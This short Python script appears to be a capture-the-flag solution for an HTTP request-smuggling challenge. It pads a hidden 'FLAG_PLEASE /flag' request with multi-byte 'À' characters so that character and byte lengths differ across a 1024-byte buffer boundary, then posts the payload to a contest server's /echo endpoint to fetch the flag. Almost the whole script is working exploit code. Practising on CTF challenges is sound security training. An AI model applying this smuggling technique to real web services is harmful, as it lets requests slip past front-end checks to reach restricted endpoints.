import requests
from app import build_http, API_HOST, API_PORT

bare = build_http(API_HOST, API_PORT, "POST", "/echo", "")
req = """FLAG_PLEASE /flag HTTP/1.1\r
Host: localhost:7777\r
\r
"""
req = req.ljust((1024 - len(bare) - 3) // 2, " ")
msg = "aa" + "À" * len(req) + req
print(msg.encode()[len(msg) :])
rq = build_http(API_HOST, API_PORT, "POST", "/echo", msg)
print(rq[:1024])
print(rq[1024:])

r = requests.post("http://ictf.maple3142.net:8888/echo", data={"msg": msg})
print(r.text)
